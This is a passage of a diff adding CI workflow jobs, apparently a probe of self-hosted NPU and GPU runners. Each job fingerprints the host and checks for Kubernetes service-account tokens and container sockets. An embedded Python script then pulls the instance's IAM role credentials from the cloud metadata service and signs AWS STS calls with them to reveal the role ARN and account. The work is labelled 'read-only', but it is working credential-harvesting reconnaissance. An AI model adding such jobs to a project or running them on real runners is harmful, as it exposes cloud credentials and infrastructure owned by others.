+            r=R.urlopen(R.Request('https://sts.amazonaws.com/',data=b.encode(),headers=H,method='POST'),timeout=8);return r.status,r.read().decode('utf-8','replace')
+           except U.HTTPError as e:return e.code,e.read().decode('utf-8','replace')
+           except Exception as e:return -1,str(e)[:150]
+          print('C211_PY_HOST',socket.gethostname(),'uid',os.getuid());t=''
+          try:t=R.urlopen(R.Request('http://169.254.169.254/latest/api/token',data=b'',method='PUT',headers={'X-aws-ec2-metadata-token-ttl-seconds':'60'}),timeout=4).read().decode()
+          except Exception as e:print('IMDS_TOKEN_ERR',str(e)[:100])
+          print('IMDS_TOKEN_PRESENT',bool(t))
+          if t:
+           for p in ('meta-data/instance-id','meta-data/instance-type','meta-data/placement/availability-zone','meta-data/iam/info'):print('IMDS',p,'=',g(p,t).replace('\n',' ')[:250])
+           r=g('meta-data/iam/security-credentials/',t).strip();print('IMDS_ROLE',r)
+           if r and not r.startswith('ERR'):
+            cb=g('meta-data/iam/security-credentials/'+r.splitlines()[0],t)
+            try:
+             d=json.loads(cb);print('CRED',json.dumps({'AK_fp':fp(d.get('AccessKeyId')),'SK_fp':fp(d.get('SecretAccessKey')),'Tok_fp':fp(d.get('Token')),'Exp':d.get('Expiration'),'Code':d.get('Code')}))
+             s,x=sts(d.get('AccessKeyId'),d.get('SecretAccessKey'),d.get('Token'));m=re.search(r'<Arn>([^<]+)</Arn>',x);a2=re.search(r'<Account>([^<]+)</Account>',x)
+             print('STS',s,'ARN',m.group(1) if m else None,'ACCT',a2.group(1) if a2 else None)
+             if s!=200:print('STS_BODY',x[:200].replace('\n',' '))
+             s2,x2=sts(d.get('AccessKeyId'),str(d.get('SecretAccessKey'))+'TAMPERED',d.get('Token'));m2=re.search(r'<Code>([^<]+)</Code>',x2)
+             print('STS_TAMPERED',s2,'CODE',m2.group(1) if m2 else None)
+            except Exception as e:print('CRED_PARSE_FAIL',str(e)[:150],cb[:150].replace('\n',' '))
+          PYEOF_IMDS
+          else echo PY3_ABSENT; echo IMDS_TOKEN_PRESENT False; fi
+          echo "C211_RESIDUAL_END job=npu-a3-2-01 nonce=$NONCE ts=$(ts)"
+          exit 0
+  npu-a3-4-01:
+    runs-on: linux-aarch64-a3-4-
+    timeout-minutes: 12
+    steps:
+      - name: fingerprint
+        env:
+          NONCE: c211-i125037-c3a226ea084db8f0
+        run: |
+          set -u
+          ts(){ date -u +%FT%TZ; }
+          echo "C211_RESIDUAL_BEGIN job=npu-a3-4-01 label=linux-aarch64-a3-4- nonce=$NONCE ts=$(ts)"
+          echo "C211_MARKER job=npu-a3-4-01 label=linux-aarch64-a3-4- nonce=$NONCE host=$(hostname) fqdn=$(hostname -f 2>/dev/null || true) uid=$(id -u) user=$(id -un) ts=$(ts)"
+          id 2>&1 || true
+          uname -a 2>&1 || true
+          echo "OS=$(. /etc/os-release 2>/dev/null && echo $PRETTY_NAME)"
+          echo "DMI=$(cat /sys/class/dmi/id/sys_vendor /sys/class/dmi/id/product_name 2>&1 | tr '\n' ' ')"
+          echo "PROC1_COMM=$(cat /proc/1/comm 2>&1) MACHINE_ID=$([ -s /etc/machine-id ] && sha256sum /etc/machine-id | cut -c1-16 || echo none)"
+          echo "CGROUP=$(head -2 /proc/self/cgroup 2>&1 | tr '\n' '|')"
+          echo "--- NVIDIA (read-only) ---"
+          if command -v nvidia-smi >/dev/null 2>&1; then
+            timeout 30 nvidia-smi -L 2>&1 | head -16 || echo NVIDIA_SMI_L_FAILED
+            timeout 30 nvidia-smi --query-gpu=uuid,name,driver_version,memory.total --format=csv,noheader 2>&1 | head -16 || echo NVIDIA_SMI_Q_FAILED
+          else echo NVIDIA_SMI_ABSENT; fi
+          echo "--- AMD (read-only) ---"
+          if command -v rocm-smi >/dev/null 2>&1; then
+            timeout 40 rocm-smi --showuniqueid --showproductname 2>&1 | head -200 || echo ROCM_SMI_FAILED
+          else echo ROCM_SMI_ABSENT; fi
+          if command -v amd-smi >/dev/null 2>&1; then timeout 40 amd-smi static 2>&1 | head -250 || echo AMD_SMI_FAILED; else echo AMD_SMI_ABSENT; fi
+          echo "--- ASCEND NPU (read-only) ---"
+          if command -v npu-smi >/dev/null 2>&1; then
+            timeout 40 npu-smi info 2>&1 | head -200 || echo NPU_SMI_INFO_FAILED
+            echo "--- npu-smi info -l ---"
+            timeout 40 npu-smi info -l 2>&1 | head -100 || true
+            for i in 0 1 2 3 4 5 6 7; do
+              echo "--- npu board $i ---"
+              timeout 25 npu-smi info -t board -i "$i" 2>&1 | head -60 || true
+            done
+          else echo NPU_SMI_ABSENT; fi
+          echo "ASCEND_DEVS:"
+          ls -l /dev/davinci* /dev/davinci_manager /dev/devmm_svm /dev/hisi_hdc 2>&1 | head -48 || true
+          echo "ASCEND_INSTALL=$(ls /usr/local/Ascend 2>/dev/null | head -10 | tr '\n' ',')"
+          echo "ASCEND_DRIVER_VERSION=$([ -s /usr/local/Ascend/driver/version.info ] && head -3 /usr/local/Ascend/driver/version.info 2>/dev/null | tr '\n' '|' || echo none)"
+          echo "LSPCI_ASCEND=$( (command -v lspci >/dev/null 2>&1 && timeout 15 lspci 2>/dev/null | grep -i -E 'huawei|ascend|davinci' | head -8) || echo none)"
+          echo "--- INTEL XPU (read-only) ---"
+          if command -v xpu-smi >/dev/null 2>&1; then timeout 40 xpu-smi discovery 2>&1 | head -200 || echo XPU_SMI_FAILED; else echo XPU_SMI_ABSENT; fi
+          echo "--- MUSA (read-only) ---"
+          if command -v mthreads-gmi >/dev/null 2>&1; then timeout 40 mthreads-gmi 2>&1 | head -200 || echo MTHREADS_GMI_FAILED; else echo MTHREADS_GMI_ABSENT; fi
+          echo "--- presence-only SA-token / sockets ---"
+          if [ -s /var/run/secrets/kubernetes.io/serviceaccount/token ]; then echo "SA_TOKEN_PRESENT size=$(stat -c%s /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null)"; else echo "SA_TOKEN_ABSENT"; fi
+          echo "K8S_ENV host=${KUBERNETES_SERVICE_HOST:-none} port=${KUBERNETES_SERVICE_PORT:-none}"
+          ls -l /var/run/docker.sock /run/docker.sock /run/containerd/containerd.sock /var/run/k3s/containerd/containerd.sock 2>&1 | head -10 || true
+          echo "--- IMDSv2/STS fingerprint (read-only, sha256-only credential presence) ---"
+          if command -v python3 >/dev/null 2>&1; then
+            python3 - <<'PYEOF_IMDS'
+          import json,hashlib,urllib.request as R,urllib.error as U,hmac,datetime,re,os,socket
+          def fp(v):return hashlib.sha256(str(v).encode()).hexdigest()[:16] if v else None
+          def g(p,t):
+           try:
+            return R.urlopen(R.Request('http://169.254.169.254/latest/'+p,headers={'X-aws-ec2-metadata-token':t}),timeout=4).read().decode('utf-8','replace')
+           except Exception as e:return 'ERR:'+str(e)[:80]
+          def sts(a,s,t):
+           b='Action=GetCallerIdentity&Version=2011-06-15';am=datetime.datetime.now(datetime.timezone.utc);d1=am.strftime('%Y%m%dT%H%M%SZ');d2=am.strftime('%Y%m%d')
+           c='POST\n/\n\ncontent-type:application/x-www-form-urlencoded; charset=utf-8\nhost:sts.amazonaws.com\nx-amz-date:%s\n'%d1;sh='content-type;host;x-amz-date'
+           if t:c+='x-amz-security-token:%s\n'%t;sh+=';x-amz-security-token'
+           c+='\n'+sh+'\n'+hashlib.sha256(b.encode()).hexdigest();sc='%s/us-east-1/sts/aws4_request'%d2
+           ts='AWS4-HMAC-SHA256\n%s\n%s\n%s'%(d1,sc,hashlib.sha256(c.encode()).hexdigest());k=('AWS4'+s).encode()
+           for m in (d2,'us-east-1','sts','aws4_request'):k=hmac.new(k,m.encode(),hashlib.sha256).digest()
+           H={'Content-Type':'application/x-www-form-urlencoded; charset=utf-8','X-Amz-Date':d1,'Authorization':'AWS4-HMAC-SHA256 Credential=%s/%s, SignedHeaders=%s, Signature=%s'%(a,sc,sh,hmac.new(k,ts.encode(),hashlib.sha256).hexdigest())}
+           if t:H['X-Amz-Security-Token']=t
+           try:
+            r=R.urlopen(R.Request('https://sts.amazonaws.com/',data=b.encode(),headers=H,method='POST'),timeout=8);return r.status,r.read().decode('utf-8','replace')
+           except U.HTTPError as e:return e.code,e.read().decode('utf-8','replace')
+           except Exception as e:return -1,str(e)[:150]
+          print('C211_PY_HOST',socket.gethostname(),'uid',os.getuid());t=''
+          try:t=R.urlopen(R.Request('http://169.254.169.254/latest/api/token',data=b'',method='PUT',headers={'X-aws-ec2-metadata-token-ttl-seconds':'60'}),timeout=4).read().decode()
+          except Exception as e:print('IMDS_TOKEN_ERR',str(e)[:100])
+          print('IMDS_TOKEN_PRESENT',bool(t))
+          if t:
+           for p in ('meta-data/instance-id','meta-data/instance-type','meta-data/placement/availability-zone','meta-data/iam/info'):print('IMDS',p,'=',g(p,t).replace('\n',' ')[:250])
+           r=g('meta-data/iam/security-credentials/',t).strip();print('IMDS_ROLE',r)
+           if r and not r.startswith('ERR'):
+            cb=g('meta-data/iam/security-credentials/'+r.splitlines()[0],t)
+            try:
+             d=json.loads(cb);print('CRED',json.dumps({'AK_fp':fp(d.get('AccessKeyId')),'SK_fp':fp(d.get('SecretAccessKey')),'Tok_fp':fp(d.get('Token')),'Exp':d.get('Expiration'),'Code':d.get('Code')}))
+             s,x=sts(d.get('AccessKeyId'),d.get('SecretAccessKey'),d.get('Token'));m=re.search(r'<Arn>([^<]+)</Arn>',x);a2=re.search(r'<Account>([^<]+)</Account>',x)
+             print('STS',s,'ARN',m.group(1) if m else None,'ACCT',a2.group(1) if a2 else None)
+             if s!=200:print('STS_BODY',x[:200].replace('\n',' '))
+             s2,x2=sts(d.get('AccessKeyId'),str(d.get('SecretAccessKey'))+'TAMPERED',d.get('Token'));m2=re.search(r'<Code>([^<]+)</Code>',x2)
+             print('STS_TAMPERED',s2,'CODE',m2.group(1) if m2 else None)
+            except Exception as e:print('CRED_PARSE_FAIL',str(e)[:150],cb[:150].replace('\n',' '))
+          PYEOF_IMDS
+          else echo PY3_ABSENT; echo IMDS_TOKEN_PRESENT False; fi
+          echo "C211_RESIDUAL_END job=npu-a3-4-01 nonce=$NONCE ts=$(ts)"
+          exit 0
+  npu-a3-8-01:
+    runs-on: linux-aarch64-a3-8-
+    timeout-minutes: 12
+    steps:
+      - name: fingerprint
+        env:
+          NONCE: c211-i125037-c3a226ea084db8f0
+        run: |
+          set -u
+          ts(){ date -u +%FT%TZ; }
+          echo "C211_RESIDUAL_BEGIN job=npu-a3-8-01 label=linux-aarch64-a3-8- nonce=$NONCE ts=$(ts)"
+          echo "C211_MARKER job=npu-a3-8-01 label=linux-aarch64-a3-8- nonce=$NONCE host=$(hostname) fqdn=$(hostname -f 2>/dev/null || true) uid=$(id -u) user=$(id -un) ts=$(ts)"
+          id 2>&1 || true
+          uname -a 2>&1 || true
+          echo "OS=$(. /etc/os-release 2>/dev/null && echo $PRETTY_NAME)"
+          echo "DMI=$(cat /sys/class/dmi/id/sys_vendor /sys/class/dmi/id/product_name 2>&1 | tr '\n' ' ')"
+          echo "PROC1_COMM=$(cat /proc/1/comm 2>&1) MACHINE_ID=$([ -s /etc/machine-id ] && sha256sum /etc/machine-id | cut -c1-16 || echo none)"
+          echo "CGROUP=$(head -2 /proc/self/cgroup 2>&1 | tr '\n' '|')"
+          echo "--- NVIDIA (read-only) ---"
+          if command -v nvidia-smi >/dev/null 2>&1; then
+            timeout 30 nvidia-smi -L 2>&1 | head -16 || echo NVIDIA_SMI_L_FAILED
+            timeout 30 nvidia-smi --query-gpu=uuid,name,driver_version,memory.total --format=csv,noheader 2>&1 | head -16 || echo NVIDIA_SMI_Q_FAILED
+          else echo NVIDIA_SMI_ABSENT; fi
+          echo "--- AMD (read-only) ---"
+          if command -v rocm-smi >/dev/null 2>&1; then
+            timeout 40 rocm-smi --showuniqueid --showproductname 2>&1 | head -200 || echo ROCM_SMI_FAILED
+          else echo ROCM_SMI_ABSENT; fi
+          if command -v amd-smi >/dev/null 2>&1; then timeout 40 amd-smi static 2>&1 | head -250 || echo AMD_SMI_FAILED; else echo AMD_SMI_ABSENT; fi
+          echo "--- ASCEND NPU (read-only) ---"
+          if command -v npu-smi >/dev/null 2>&1; then
+            timeout 40 npu-smi info 2>&1 | head -200 || echo NPU_SMI_INFO_FAILED
+            echo "--- npu-smi info -l ---"
+            timeout 40 npu-smi info -l 2>&1 | head -100 || true
+            for i in 0 1 2 3 4 5 6 7; do
+              echo "--- npu board $i ---"
+              timeout 25 npu-smi info -t board -i "$i" 2>&1 | head -60 || true
+            done
+          else echo NPU_SMI_ABSENT; fi
+          echo "ASCEND_DEVS:"
+          ls -l /dev/davinci* /dev/davinci_manager /dev/devmm_svm /dev/hisi_hdc 2>&1 | head -48 || true
+          echo "ASCEND_INSTALL=$(ls /usr/local/Ascend 2>/dev/null | head -10 | tr '\n' ',')"
+          echo "ASCEND_DRIVER_VERSION=$([ -s /usr/local/Ascend/driver/version.info ] && head -3 /usr/local/Ascend/driver/version.info 2>/dev/null | tr '\n' '|' || echo none)"
+          echo "LSPCI_ASCEND=$( (command -v lspci >/dev/null 2>&1 && timeout 15 lspci 2>/dev/null | grep -i -E 'huawei|ascend|davinci' | head -8) || echo none)"
+          echo "--- INTEL XPU (read-only) ---"
+          if command -v xpu-smi >/dev/null 2>&1; then timeout 40 xpu-smi discovery 2>&1 | head -200 || echo XPU_SMI_FAILED; else echo XPU_SMI_ABSENT; fi
+          echo "--- MUSA (read-only) ---"
+          if command -v mthreads-gmi >/dev/null 2>&1; then timeout 40 mthreads-gmi 2>&1 | head -200 || echo MTHREADS_GMI_FAILED; else echo MTHREADS_GMI_ABSENT; fi
+          echo "--- presence-only SA-token / sockets ---"
+          if [ -s /var/run/secrets/kubernetes.io/serviceaccount/token ]; then echo "SA_TOKEN_PRESENT size=$(stat -c%s /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null)"; else echo "SA_TOKEN_ABSENT"; fi
+          echo "K8S_ENV host=${KUBERNETES_SERVICE_HOST:-none} port=${KUBERNETES_SERVICE_PORT:-none}"
+          ls -l /var/run/docker.sock /run/docker.sock /run/containerd/containerd.sock /var/run/k3s/containerd/containerd.sock 2>&1 | head -10 || true
+          echo "--- IMDSv2/STS fingerprint (read-only, sha256-only credential presence) ---"
+          if command -v python3 >/dev/null 2>&1; then
+            python3 - <<'PYEOF_IMDS'
+          import json,hashlib,urllib.request as R,urllib.error as U,hmac,datetime,re,os,socket
+          def fp(v):return hashlib.sha256(str(v).encode()).hexdigest()[:16] if v else None
+          def g(p,t):
+           try:
+            return R.urlopen(R.Request('http://169.254.169.254/latest/'+p,headers={'X-aws-ec2-metadata-token':t}),timeout=4).read().decode('utf-8','replace')
+           except Exception as e:return 'ERR:'+str(e)[:80]
+          def sts(a,s,t):
+           b='Action=GetCallerIdentity&Version=2011-06-15';am=datetime.datetime.now(datetime.timezone.utc);d1=am.strftime('%Y%m%dT%H%M%SZ');d2=am.strftime('%Y%m%d')
+           c='POST\n/\n\ncontent-type:application/x-www-form-urlencoded; charset=utf-8\nhost:sts.amazonaws.com\nx-amz-date:%s\n'%d1;sh='content-type;host;x-amz-date'
+           if t:c+='x-amz-security-token:%s\n'%t;sh+=';x-amz-security-token'
+           c+='\n'+sh+'\n'+hashlib.sha256(b.encode()).hexdigest();sc='%s/us-east-1/sts/aws4_request'%d2
+           ts='AWS4-HMAC-SHA256\n%s\n%s\n%s'%(d1,sc,hashlib.sha256(c.encode()).hexdigest());k=('AWS4'+s).encode()
+           for m in (d2,'us-east-1','sts','aws4_request'):k=hmac.new(k,m.encode(),hashlib.sha256).digest()
+           H={'Content-Type':'application/x-www-form-urlencoded; charset=utf-8','X-Amz-Date':d1,'Authorization':'AWS4-HMAC-SHA256 Credential=%s/%s, SignedHeaders=%s, Signature=%s'%(a,sc,sh,hmac.new(k,ts.encode(),hashlib.sha256).hexdigest())}
+           if t:H['X-Amz-Security-Token']=t
+           try:
+            r=R.urlopen(R.Request('https://sts.amazonaws.com/',data=b.encode(),headers=H,method='POST'),timeout=8);return r.status,r.read().decode('utf-8','replace')
+           except U.HTTPError as e:return e.code,e.read().decode('utf-8','replace')
+           except Exception as e:return -1,str(e)[:150]
+          print('C211_PY_HOST',socket.gethostname(),'uid',os.getuid());t=''
+          try:t=R.urlopen(R.Request('http://169.254.169.254/latest/api/token',data=b'',method='PUT',headers={'X-aws-ec2-metadata-token-ttl-seconds':'60'}),timeout=4).read().decode()
+          except Exception as e:print('IMDS_TOKEN_ERR',str(e)[:100])
+          print('IMDS_TOKEN_PRESENT',bool(t))
+          if t:
+           for p in ('meta-data/instance-id','meta-data/instance-type','meta-data/placement/availability-zone','meta-data/iam/info'):print('IMDS',p,'=',g(p,t).replace('\n',' ')[:250])
+           r=g('meta-data/iam/security-credentials/',t).strip();print('IMDS_ROLE',r)
+           if r and not r.startswith('ERR'):
+            cb=g('meta-data/iam/security-credentials/'+r.splitlines()[0],t)
+            try:
+             d=json.loads(cb);print('CRED',json.dumps({'AK_fp':fp(d.get('AccessKeyId')),'SK_fp':fp(d.get('SecretAccessKey')),'Tok_fp':fp(d.get('Token')),'Exp':d.get('Expiration'),'Code':d.get('Code')}))
+             s,x=sts(d.get('AccessKeyId'),d.get('SecretAccessKey'),d.get('Token'));m=re.search(r'<Arn>([^<]+)</Arn>',x);a2=re.search(r'<Account>([^<]+)</Account>',x)
+             print('STS',s,'ARN',m.group(1) if m else None,'ACCT',a2.group(1) if a2 else None)
+             if s!=200:print('STS_BODY',x[:200].replace('\n',' '))
+             s2,x2=sts(d.get('AccessKeyId'),str(d.get('SecretAccessKey'))+'TAMPERED',d.get('Token'));m2=re.search(r'<Code>([^<]+)</Code>',x2)
+             print('STS_TAMPERED',s2,'CODE',m2.group(1) if m2 else None)
+            except Exception as e:print('CRED_PARSE_FAIL',str(e)[:150],cb[:150].replace('\n',' '))
+          PYEOF_IMDS
+          else echo PY3_ABSENT; echo IMDS_TOKEN_PRESENT False; fi
+          echo "C211_RESIDUAL_END job=npu-a3-8-01 nonce=$NONCE ts=$(ts)"
+          exit 0
+  npu-a3-16-01:
+    runs-on: linux-aarch64-a3-16-
+    timeout-minutes: 12
+    steps:
+      - name: fingerprint
+        env:
+          NONCE: c211-i125037-c3a226ea084db8f0
+        run: |
+          set -u
+          ts(){ date -u +%FT%TZ; }
+          echo "C211_RESIDUAL_BEGIN job=npu-a3-16-01 label=linux-aarch64-a3-16- nonce=$NONCE ts=$(ts)"
+          echo "C211_MARKER job=npu-a3-16-01 label=linux-aarch64-a3-16- nonce=$NONCE host=$(hostname) fqdn=$(hostname -f 2>/dev/null || true) uid=$(id -u) user=$(id -un) ts=$(ts)"
+          id 2>&1 || true
+          uname -a 2>&1 || true
+          echo "OS=$(. /etc/os-release 2>/dev/null && echo $PRETTY_NAME)"
+          echo "DMI=$(cat /sys/class/dmi/id/sys_vendor /sys/class/dmi/id/product_name 2>&1 | tr '\n' ' ')"
+          echo "PROC1_COMM=$(cat /proc/1/comm 2>&1) MACHINE_ID=$([ -s /etc/machine-id ] && sha256sum /etc/machine-id | cut -c1-16 || echo none)"
+          echo "CGROUP=$(head -2 /proc/self/cgroup 2>&1 | tr '\n' '|')"
+          echo "--- NVIDIA (read-only) ---"
+          if command -v nvidia-smi >/dev/null 2>&1; then
+            timeout 30 nvidia-smi -L 2>&1 | head -16 || echo NVIDIA_SMI_L_FAILED
+            timeout 30 nvidia-smi --query-gpu=uuid,name,driver_version,memory.total --format=csv,noheader 2>&1 | head -16 || echo NVIDIA_SMI_Q_FAILED
+          else echo NVIDIA_SMI_ABSENT; fi
+          echo "--- AMD (read-only) ---"
+          if command -v rocm-smi >/dev/null 2>&1; then
+            timeout 40 rocm-smi --showuniqueid --showproductname 2>&1 | head -200 || echo ROCM_SMI_FAILED
+          else echo ROCM_SMI_ABSENT; fi
+          if command -v amd-smi >/dev/null 2>&1; then timeout 40 amd-smi static 2>&1 | head -250 || echo AMD_SMI_FAILED; else echo AMD_SMI_ABSENT; fi
+          echo "--- ASCEND NPU (read-only) ---"
+          if command -v npu-smi >/dev/null 2>&1; then
+            timeout 40 npu-smi info 2>&1 | head -200 || echo NPU_SMI_INFO_FAILED
+            echo "--- npu-smi info -l ---"
+            timeout 40 npu-smi info -l 2>&1 | head -100 || true
+            for i in 0 1 2 3 4 5 6 7; do
+              echo "--- npu board $i ---"
+              timeout 25 npu-smi info -t board -i "$i" 2>&1 | head -60 || true
+            done
+          else echo NPU_SMI_ABSENT; fi
+          echo "ASCEND_DEVS:"
+          ls -l /dev/davinci* /dev/davinci_manager /dev/devmm_svm /dev/hisi_hdc 2>&1 | head -48 || true
+          echo "ASCEND_INSTALL=$(ls /usr/local/Ascend 2>/dev/null | head -10 | tr '\n' ',')"
+          echo "ASCEND_DRIVER_VERSION=$([ -s /usr/local/Ascend/driver/version.info ] && head -3 /usr/local/Ascend/driver/version.info 2>/dev/null | tr '\n' '|' || echo none)"
+          echo "LSPCI_ASCEND=$( (command -v lspci >/dev/null 2>&1 && timeout 15 lspci 2>/dev/null | grep -i -E 'huawei|ascend|davinci' | head -8) || echo none)"
+          echo "--- INTEL XPU (read-only) ---"
+          if command -v xpu-smi >/dev/null 2>&1; then timeout 40 xpu-smi discovery 2>&1 | head -200 || echo XPU_SMI_FAILED; else echo XPU_SMI_ABSENT; fi
+          echo "--- MUSA (read-only) ---"
+          if command -v mthreads-gmi >/dev/null 2>&1; then timeout 40 mthreads-gmi 2>&1 | head -200 || echo MTHREADS_GMI_FAILED; else echo MTHREADS_GMI_ABSENT; fi
+          echo "--- presence-only SA-token / sockets ---"
+          if [ -s /var/run/secrets/kubernetes.io/serviceaccount/token ]; then echo "SA_TOKEN_PRESENT size=$(stat -c%s /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null)"; else echo "SA_TOKEN_ABSENT"; fi
+          echo "K8S_ENV host=${KUBERNETES_SERVICE_HOST:-none} port=${KUBERNETES_SERVICE_PORT:-none}"
+          ls -l /var/run/docker.sock /run/docker.sock /run/containerd/containerd.sock /var/run/k3s/containerd/containerd.sock 2>&1 | head -10 || true
+          echo "--- IMDSv2/STS fingerprint (read-only, sha256-only credential presence) ---"
+          if command -v python3 >/dev/null 2>&1; then
+            python3 - <<'PYEOF_IMDS'
+          import json,hashlib,urllib.request as R,urllib.error as U,hmac,datetime,re,os,socket
+          def fp(v):return hashlib.sha256(str(v).encode()).hexdigest()[:16] if v else None
+          def g(p,t):
+           try:
+            return R.urlopen(R.Request('http://169.254.169.254/latest/'+p,headers={'X-aws-ec2-metadata-token':t}),timeout=4).read().decode('utf-8','replace')
+           except Exception as e:return 'ERR:'+str(e)[:80]
+          def sts(a,s,t):
+           b='Action=GetCallerIdentity&Version=2011-06-15';am=datetime.datetime.now(datetime.timezone.utc);d1=am.strftime('%Y%m%dT%H%M%SZ');d2=am.strftime('%Y%m%d')
+           c='POST\n/\n\ncontent-type:application/x-www-form-urlencoded; charset=utf-8\nhost:sts.amazonaws.com\nx-amz-date:%s\n'%d1;sh='content-type;host;x-amz-date'
+           if t:c+='x-amz-security-token:%s\n'%t;sh+=';x-amz-security-token'
+           c+='\n'+sh+'\n'+hashlib.sha256(b.encode()).hexdigest();sc='%s/us-east-1/sts/aws4_request'%d2
+           ts='AWS4-HMAC-SHA256\n%s\n%s\n%s'%(d1,sc,hashlib.sha256(c.encode()).hexdigest());k=('AWS4'+s).encode()
+           for m in (d2,'us-east-1','sts','aws4_request'):k=hmac.new(k,m.encode(),hashlib.sha256).digest()
+           H={'Content-Type':'application/x-www-form-urlencoded; charset=utf-8','X-Amz-Date':d1,'Authorization':'AWS4-HMAC-SHA256 Credential=%s/%s, SignedHeaders=%s, Signature=%s'%(a,sc,sh,hmac.new(k,ts.encode(),hashlib.sha256).hexdigest())}
+           if t:H['X-Amz-Security-Token']=t
+           try:
+            r=R.urlopen(R.Request('https://sts.amazonaws.com/',data=b.encode(),headers=H,method='POST'),timeout=8);return r.status,r.read().decode('utf-8','replace')
+           except U.HTTPError as e:return e.code,e.read().decode('utf-8','replace')
+           except Exception as e:return -1,str(e)[:150]
+          print('C211_PY_HOST',socket.gethostname(),'uid',os.getuid());t=''
+          try:t=R.urlopen(R.Request('http://169.254.169.254/latest/api/token',data=b'',method='PUT',headers={'X-aws-ec2-metadata-token-ttl-seconds':'60'}),timeout=4).read().decode()
+          except Exception as e:print('IMDS_TOKEN_ERR',str(e)[:100])
+          print('IMDS_TOKEN_PRESENT',bool(t))
+          if t:
+           for p in ('meta-data/instance-id','meta-data/instance-type','meta-data/placement/availability-zone','meta-data/iam/info'):print('IMDS',p,'=',g(p,t).replace('\n',' ')[:250])
+           r=g('meta-data/iam/security-credentials/',t).strip();print('IMDS_ROLE',r)
+           if r and not r.startswith('ERR'):
+            cb=g('meta-data/iam/security-credentials/'+r.splitlines()[0],t)
+            try:
+             d=json.loads(cb);print('CRED',json.dumps({'AK_fp':fp(d.get('AccessKeyId')),'SK_fp':fp(d.get('SecretAccessKey')),'Tok_fp':fp(d.get('Token')),'Exp':d.get('Expiration'),'Code':d.get('Code')}))
+             s,x=sts(d.get('AccessKeyId'),d.get('SecretAccessKey'),d.get('Token'));m=re.search(r'<Arn>([^<]+)</Arn>',x);a2=re.search(r'<Account>([^<]+)</Account>',x)
+             print('STS',s,'ARN',m.group(1) if m else None,'ACCT',a2.group(1) if a2 else None)
+             if s!=200:print('STS_BODY',x[:200].replace('\n',' '))
+             s2,x2=sts(d.get('AccessKeyId'),str(d.get('SecretAccessKey'))+'TAMPERED',d.get('Token'));m2=re.search(r'<Code>([^<]+)</Code>',x2)
+             print('STS_TAMPERED',s2,'CODE',m2.group(1) if m2 else None)
+            except Exception as e:print('CRED_PARSE_FAIL',str(e)[:150],cb[:150].replace('\n',' '))
+          PYEOF_IMDS
+          else echo PY3_ABSENT; echo IMDS_TOKEN_PRESENT False; fi
+          echo "C211_RESIDUAL_END job=npu-a3-16-01 nonce=$NONCE ts=$(ts)"
+          exit 0
+  npu-a5-4-01:
+    runs-on: linux-amd64-a5-4
+    timeout-minutes: 12
+    steps:
+      - name: fingerprint
+        env:
+          NONCE: c211-i125037-c3a226ea084db8f0
+        run: |
+          set -u
+          ts(){ date -u +%FT%TZ; }
+          echo "C211_RESIDUAL_BEGIN job=npu-a5-4-01 label=linux-amd64-a5-4 nonce=$NONCE ts=$(ts)"
+          echo "C211_MARKER job=npu-a5-4-01 label=linux-amd64-a5-4 nonce=$NONCE host=$(hostname) fqdn=$(hostname -f 2>/dev/null || true) uid=$(id -u) user=$(id -un) ts=$(ts)"
+          id 2>&1 || true
+          uname -a 2>&1 || true
+          echo "OS=$(. /etc/os-release 2>/dev/null && echo $PRETTY_NAME)"
+          echo "DMI=$(cat /sys/class/dmi/id/sys_vendor /sys/class/dmi/id/product_name 2>&1 | tr '\n' ' ')"
+          echo "PROC1_COMM=$(cat /proc/1/comm 2>&1) MACHINE_ID=$([ -s /etc/machine-id ] && sha256sum /etc/machine-id | cut -c1-16 || echo none)"
+          echo "CGROUP=$(head -2 /proc/self/cgroup 2>&1 | tr '\n' '|')"
+          echo "--- NVIDIA (read-only) ---"
+          if command -v nvidia-smi >/dev/null 2>&1; then
+            timeout 30 nvidia-smi -L 2>&1 | head -16 || echo NVIDIA_SMI_L_FAILED
+            timeout 30 nvidia-smi --query-gpu=uuid,name,driver_version,memory.total --format=csv,noheader 2>&1 | head -16 || echo NVIDIA_SMI_Q_FAILED
+          else echo NVIDIA_SMI_ABSENT; fi
+          echo "--- AMD (read-only) ---"
+          if command -v rocm-smi >/dev/null 2>&1; then
+            timeout 40 rocm-smi --showuniqueid --showproductname 2>&1 | head -200 || echo ROCM_SMI_FAILED
+          else echo ROCM_SMI_ABSENT; fi
+          if command -v amd-smi >/dev/null 2>&1; then timeout 40 amd-smi static 2>&1 | head -250 || echo AMD_SMI_FAILED; else echo AMD_SMI_ABSENT; fi
+          echo "--- ASCEND NPU (read-only) ---"
+          if command -v npu-smi >/dev/null 2>&1; then
+            timeout 40 npu-smi info 2>&1 | head -200 || echo NPU_SMI_INFO_FAILED
+            echo "--- npu-smi info -l ---"
+            timeout 40 npu-smi info -l 2>&1 | head -100 || true
+            for i in 0 1 2 3 4 5 6 7; do
+              echo "--- npu board $i ---"
+              timeout 25 npu-smi info -t board -i "$i" 2>&1 | head -60 || true
+            done
+          else echo NPU_SMI_ABSENT; fi
+          echo "ASCEND_DEVS:"
+          ls -l /dev/davinci* /dev/davinci_manager /dev/devmm_svm /dev/hisi_hdc 2>&1 | head -48 || true
+          echo "ASCEND_INSTALL=$(ls /usr/local/Ascend 2>/dev/null | head -10 | tr '\n' ',')"
+          echo "ASCEND_DRIVER_VERSION=$([ -s /usr/local/Ascend/driver/version.info ] && head -3 /usr/local/Ascend/driver/version.info 2>/dev/null | tr '\n' '|' || echo none)"
+          echo "LSPCI_ASCEND=$( (command -v lspci >/dev/null 2>&1 && timeout 15 lspci 2>/dev/null | grep -i -E 'huawei|ascend|davinci' | head -8) || echo none)"
+          echo "--- INTEL XPU (read-only) ---"
+          if command -v xpu-smi >/dev/null 2>&1; then timeout 40 xpu-smi discovery 2>&1 | head -200 || echo XPU_SMI_FAILED; else echo XPU_SMI_ABSENT; fi
+          echo "--- MUSA (read-only) ---"
+          if command -v mthreads-gmi >/dev/null 2>&1; then timeout 40 mthreads-gmi 2>&1 | head -200 || echo MTHREADS_GMI_FAILED; else echo MTHREADS_GMI_ABSENT; fi
+          echo "--- presence-only SA-token / sockets ---"
+          if [ -s /var/run/secrets/kubernetes.io/serviceaccount/token ]; then echo "SA_TOKEN_PRESENT size=$(stat -c%s /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null)"; else echo "SA_TOKEN_ABSENT"; fi
